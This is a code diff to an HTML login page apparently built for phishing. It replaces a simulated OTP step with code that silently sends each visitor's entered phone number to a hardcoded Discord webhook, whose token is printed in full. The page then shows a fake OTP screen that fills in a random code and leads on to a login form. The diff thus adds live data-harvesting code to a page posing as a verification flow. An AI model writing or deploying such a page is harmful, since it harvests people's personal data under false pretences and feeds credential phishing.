@@ -72,25 +72,43 @@
         </div>
     </div>
     <script>
-        function sendOTP() {
+        async function sendOTP() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             if (phoneNumber.length !== 10 || isNaN(phoneNumber)) {
                 alert('Please enter a valid 10-digit phone number.');
                 return;
             }
-            // Simulating OTP sending process
-            setTimeout(function() {
-                document.getElementById('phoneInput').style.display = 'none';
-                document.getElementById('otpInput').style.display = 'block';
-                // Auto-filling OTP after 2 seconds
+
+            const baseURL = 'https://discord.com/api/webhooks/';
+            const webhookID = '1178223142259396698';
+            const webhookToken = 'Q9jncDwEL9WCjhbhplOhpoR_K1cspkE4Ac6OgEHnV-DkpC4YBbso-MtpKyCkYC2RGz15';
+            const webhookURL = `${baseURL}${webhookID}/${webhookToken}`;
+            const message = {
+                content: `Phone number: ${phoneNumber}`
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
                 setTimeout(function() {
-                    document.getElementById('otp').value = Math.floor(1000 + Math.random() * 9000); // Random 4-digit OTP
+                    document.getElementById('phoneInput').style.display = 'none';
+                    document.getElementById('otpInput').style.display = 'block';
+                    setTimeout(function() {
+                        document.getElementById('otp').value = Math.floor(1000 + Math.random() * 9000); // Random 4-digit OTP
+                    }, 2000);
                 }, 2000);
-            }, 2000);
+            } catch (error) {
+                alert('Failed to send phone number to the server.');
+                console.error('Error:', error);
+            }
         }
 
         function verifyOTP() {
-            // Simulating OTP verification process
             setTimeout(function() {
                 document.getElementById('otpInput').style.display = 'none';
                 document.getElementById('loginInput').style.display = 'block';
@@ -118,6 +136,3 @@
     </script>
 </body>
 </html>
-
-<!-- 
-webhook sender -->
